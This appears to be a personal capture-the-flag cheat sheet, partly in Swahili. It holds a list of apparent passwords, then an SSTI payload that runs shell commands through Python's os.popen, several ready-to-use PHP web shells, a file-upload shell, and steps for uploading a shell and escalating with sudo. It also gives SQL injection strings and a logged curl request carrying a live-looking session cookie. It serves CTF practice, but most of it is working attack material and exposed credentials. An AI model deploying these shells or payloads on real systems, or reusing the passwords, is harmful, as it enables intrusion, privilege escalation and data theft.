##############
K1j1t0nyamA!2
P@rrot0S_2026
Bongo#Flav@99
Cyber$ecu1itY
#############


https://hackviser.com/tactics/pentesting/web/sql-injection

# HOW TO REGISRER A NEW ACOUUNT 
eg 
json
{
  "username": "admin",
  "username": "YOUR_USERNAME"
}

**real**
curl -s -c cookies.txt -X POST https://challenge-0726.intigriti.io/api/register \
  -H 'content-type: application/json' \
  -d '{"username":"YOUR_USERNAME","password":"YOUR_PASSWORD"}'








# WEB EXPLOITATION
1.Testing for SSTI
write :  {{7*7}}  then submit!
when return 49 means it accept your request!
So write again : {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('cat flag*')|attr('read')()}}

2.Shell.php upload 
create file name as shell.php

Step 2 — Upload Web Shell
<?php
if(isset($_GET['cmd'])){
echo "<pre>";
$cmd = $_GET['cmd'];
system($cmd);
echo "</pre>";
}
?>

Step 3 — Locate Uploaded File
https://[URL_YA_CTF]/upload.php

Step 4 — Verifying Shell Access
https://[URL_YA_CTF]/uploads/shell.php?cmd=whoami
when return www-data means it accept and your payload work!

Step 5 — Leveraging Elevated Privileges [CHEKI HAKI ZAKO UNAWEZA FANYA NINI]
payloads :?cmd=sudo -l / ?cmd=sudo%20-l

Step 6 — Retrieving the Flag
http://[URL_YA_CTF]/uploads/shell.php?cmd=sudo cat /root/flag.txt

**REMOTE CODE EXECUTION**
# Simple PHP webshell
<?php system($_GET['cmd']); ?>

# More feature-rich webshell
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

# PHP info shell (for reconnaissance)
<?php phpinfo(); ?>

# File upload shell
<?php
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "Uploaded: " . $_FILES['f']['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="f">
<input type="submit" value="Upload">
</form>

SQL Injection
SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It enables attackers to view, modify, or delete data they are not normally able to access.
# Detection

Manual Testing
Quote Tests
Tests for SQL parsing errors by injecting different types of quotes:
# Quote tests - Testing for SQL parsing errors
username'   # Single quote - Most common SQL injection test
username"   # Double quote - Used in some database types
username`   # Backtick - Mainly for MySQL identifier injection

# Logic Tests
Verifies query manipulation possibilities through boolean logic:
username' OR '1'='1   # Always true condition, often bypasses authentication
username' AND '1'='2  # Always false condition, verifies boolean responses
username' WAITFOR DELAY '0:0:5'--  # Time-based test, checks for blind injection

# Error Tests
Forces database errors to gather information about the backend:
username' AND 1=convert(int,@@version)--       # Forces type conversion error, reveals MSSQL version
username' AND 1=cast((SELECT @@version) as int)--  # Alternative version check for MSSQL

# SQL INJECTION TROUGH COOKIES
┌─[✗]─[live@parrot]─[~]
└──╼ $curl -H "cookie:connect.sid=s%3AKVZWr3DsL9RDCdAS5y_Mv__c_B4qk8KD.hZhhC9fdHwrvYTU0ZIpVeTbr17wkozuckgVb%2FhgrG6g" "http://labs.ctfzone.com:6221/api/contacts/search?q=a%27%29%20OR%201=1%20--%20"
PAYLOAD USED:   search?q=a%27%29%20OR%201=1%20--%20"













































